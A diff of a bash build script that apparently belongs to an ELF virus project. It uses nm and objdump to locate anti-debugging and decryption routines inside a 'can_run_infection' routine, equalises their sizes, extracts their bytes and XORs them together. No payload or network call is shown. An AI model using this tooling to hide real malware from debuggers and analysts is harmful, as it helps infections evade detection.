@@ -5,8 +5,7 @@ trap cleanup EXIT
 
 cleanup()
 {
-#	rm -r "$WORK_FOLDER"
-	true
+	rm -r "$WORK_FOLDER"
 }
 
 main()
@@ -14,14 +13,12 @@ main()
 	same_size_between_payloads
 	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_anti_debugging2.o $WORK_FOLDER/TMP_main_without_anti_debugging.s
 	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_uncipher2.o $WORK_FOLDER/TMP_main_without_uncipher.s
-	# DEBUG SHOULD BE THE SAME BY PAIR
-	objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_uncipher2.o | grep -E "^[0-9a-z].*TMP_anti_debugging.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc
-	objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_uncipher2.o | grep -E "^[0-9a-z].*TMP_END_anti_debugging.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc
-	objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep -E "^[0-9a-z].*TMP_uncipher.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc
-	objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep -E "^[0-9a-z].*TMP_END_uncipher.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc
+	start_address=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep "can_run_infection.TMP_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/0x\1/')
+	stop_address=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep "can_run_infection.TMP_END_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/obase=16;ibase=16;\U\1+1/' | bc | sed 's/^/0x/')
 
-	START=$(objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_uncipher2.o | grep -E "^[0-9a-z].*TMP_anti_debugging.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
-	END=$(objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_uncipher2.o | grep -E "^[0-9a-z].*TMP_END_anti_debugging.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
+	START=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | head -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
+	END=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | tail -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
+
 	cat $WORK_FOLDER/TMP_main_without_uncipher2.o | head -c+$END | tail -c+$START > anti_debugging.bin
 	cat $WORK_FOLDER/TMP_main_without_anti_debugging2.o | head -c+$END | tail -c+$START > ciphering.bin
 	python xor.py
@@ -38,11 +35,11 @@ same_size_between_payloads()
 	# TODO Change ../ with absolute path from this script or cd
 	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_anti_debugging.o $WORK_FOLDER/TMP_main_without_anti_debugging.s
 	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_uncipher.o $WORK_FOLDER/TMP_main_without_uncipher.s
-	start_offset=$(objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_uncipher.o | grep -E "^[0-9a-z].*TMP_anti_debugging.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
-	end_offset=$(objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_uncipher.o | grep -E "^[0-9a-z].*TMP_END_anti_debugging.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
+	start_offset=$(nm $WORK_FOLDER/TMP_main_without_uncipher.o | grep "can_run_infection.TMP_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
+	end_offset=$(nm $WORK_FOLDER/TMP_main_without_uncipher.o | grep "can_run_infection.TMP_END_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
 	anti_debugging_size=$((end_offset-start_offset))
-	start_offset=$(objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_anti_debugging.o | grep -E "^[0-9a-z].*TMP_uncipher.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
-	end_offset=$(objdump -F -d --show-all-symbols $WORK_FOLDER/TMP_main_without_anti_debugging.o | grep -E "^[0-9a-z].*TMP_END_uncipher.*File Offset" | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
+	start_offset=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging.o | grep "can_run_infection.TMP_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
+	end_offset=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging.o | grep "can_run_infection.TMP_END_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
 	cipher_size=$((end_offset-start_offset))
 	if [[ $cipher_size -lt $anti_debugging_size ]]; then
 		diff_size=$((anti_debugging_size-cipher_size))
